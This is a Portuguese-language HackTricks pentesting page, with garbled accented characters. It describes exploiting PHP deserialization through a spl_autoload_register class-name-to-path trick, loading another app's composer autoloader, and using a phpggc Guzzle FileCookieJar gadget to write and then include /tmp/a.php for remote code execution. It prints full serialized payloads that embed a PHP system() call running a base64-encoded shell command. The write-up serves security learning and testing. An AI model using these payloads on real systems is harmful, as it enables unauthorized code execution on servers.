# PHP - DesserializaÃ§Ã£o + Classes de Autocarregamento

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Primeiro, vocÃª deve verificar o que sÃ£o [**Classes de Autocarregamento**](https://www.php.net/manual/en/language.oop5.autoload.php).

## DesserializaÃ§Ã£o PHP + spl\_autoload\_register + LFI/Gadget

Estamos em uma situaÃ§Ã£o em que encontramos uma **desserializaÃ§Ã£o PHP em um aplicativo da web** sem nenhuma biblioteca vulnerÃ¡vel a gadgets dentro do **`phpggc`**. No entanto, no mesmo contÃªiner, havia um **outro aplicativo da web do composer com bibliotecas vulnerÃ¡veis**. Portanto, o objetivo era **carregar o carregador do composer do outro aplicativo da web** e abusÃ¡-lo para **carregar um gadget que irÃ¡ explorar essa biblioteca com um gadget** do aplicativo da web vulnerÃ¡vel Ã  desserializaÃ§Ã£o.

Passos:

* VocÃª encontrou uma **desserializaÃ§Ã£o** e **nÃ£o hÃ¡ nenhum gadget** no cÃ³digo do aplicativo atual
* VocÃª pode abusar de uma funÃ§Ã£o **`spl_autoload_register`** como a seguinte para **carregar qualquer arquivo local com extensÃ£o `.php`**
  * Para isso, vocÃª usa uma desserializaÃ§Ã£o em que o nome da classe estarÃ¡ dentro de **`$name`**. VocÃª **nÃ£o pode usar "/" ou "."** em um nome de classe em um objeto serializado, mas o **cÃ³digo** estÃ¡ **substituindo** os **sublinhados** ("\_") **por barras** ("/"). Portanto, um nome de classe como `tmp_passwd` serÃ¡ transformado em `/tmp/passwd.php` e o cÃ³digo tentarÃ¡ carregÃ¡-lo.\
    Um **exemplo de gadget** serÃ¡: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

   if (preg_match('/Controller$/', $name)) {
       $name = "controllers/${name}";
   } elseif (preg_match('/Model$/', $name)) {
       $name = "models/${name}";
   } elseif (preg_match('/_/', $name)) {
       $name = preg_replace('/_/', '/', $name);
   }

   $filename = "/${name}.php";

   if (file_exists($filename)) {
       require $filename;
   }
   elseif (file_exists(__DIR__ . $filename)) {
       require __DIR__ . $filename;
   }
});
```
{% hint style="success" %}
Se vocÃª tem um **upload de arquivo** e pode fazer upload de um arquivo com extensÃ£o **`.php`**, vocÃª pode **abusar dessa funcionalidade diretamente** e jÃ¡ obter RCE.
{% endhint %}

No meu caso, eu nÃ£o tinha nada assim, mas havia dentro do **mesmo container** outra pÃ¡gina da web do composer com uma **biblioteca vulnerÃ¡vel a um gadget `phpggc`**.

* Para carregar essa outra biblioteca, primeiro vocÃª precisa **carregar o carregador do composer daquela outra pÃ¡gina da web** (porque o da aplicaÃ§Ã£o atual nÃ£o acessarÃ¡ as bibliotecas da outra). **Sabendo o caminho da aplicaÃ§Ã£o**, vocÃª pode fazer isso muito facilmente com: **`O:28:"www_frontend_vendor_autoload":0:{}`** (No meu caso, o carregador do composer estava em `/www/frontend/vendor/autoload.php`)
* Agora, vocÃª pode **carregar** o **carregador do composer** das outras **aplicaÃ§Ãµes**, entÃ£o Ã© hora de **`gerar o payload phpggc`** para usar. No meu caso, usei **`Guzzle/FW1`**, o que me permitiu **escrever qualquer arquivo no sistema de arquivos**.
  * NOTA: O **gadget gerado nÃ£o estava funcionando**, para que funcionasse, eu **modifiquei** aquele payload **`chain.php`** do phpggc e defini **todos os atributos** das classes **de privado para pÃºblico**. Caso contrÃ¡rio, apÃ³s desserializar a string, os atributos dos objetos criados nÃ£o tinham nenhum valor.
* Agora temos o caminho para **carregar o carregador do composer das outras aplicaÃ§Ãµes** e temos um **payload phpggc que funciona**, mas precisamos **fazer isso na MESMA REQUISIÃ‡ÃƒO para que o carregador seja carregado quando o gadget for usado**. Para isso, enviei um array serializado com ambos os objetos como:
  * VocÃª pode ver **primeiro o carregador sendo carregado e depois o payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Agora, podemos **criar e escrever um arquivo**, no entanto, o usuÃ¡rio **nÃ£o pode escrever em qualquer pasta dentro do servidor web**. EntÃ£o, como vocÃª pode ver na carga Ãºtil, o PHP chamando **`system`** com algum **base64** Ã© criado em **`/tmp/a.php`**. EntÃ£o, podemos **reutilizar o primeiro tipo de carga Ãºtil** que usamos como LFI para carregar o carregador do composer do outro aplicativo da web **para carregar o arquivo `/tmp/a.php`** gerado. Basta adicionÃ¡-lo ao gadget de desserializaÃ§Ã£o: &#x20; 

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Resumo do payload**

* **Carregar o autoload do composer** de um aplicativo da web diferente no mesmo contÃªiner
* **Carregar um gadget phpggc** para abusar de uma biblioteca do outro aplicativo da web (o aplicativo da web inicial vulnerÃ¡vel Ã  desserializaÃ§Ã£o nÃ£o tinha nenhum gadget em suas bibliotecas)
* O gadget irÃ¡ **criar um arquivo com um payload PHP** nele em /tmp/a.php com comandos maliciosos (o usuÃ¡rio do aplicativo da web nÃ£o pode escrever em nenhuma pasta de nenhum aplicativo da web)
* A parte final do nosso payload irÃ¡ **carregar o arquivo php gerado** que executarÃ¡ comandos

Eu precisei **chamar essa desserializaÃ§Ã£o duas vezes**. Nos meus testes, na primeira vez o arquivo `/tmp/a.php` foi criado, mas nÃ£o carregado, e na segunda vez ele foi carregado corretamente.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
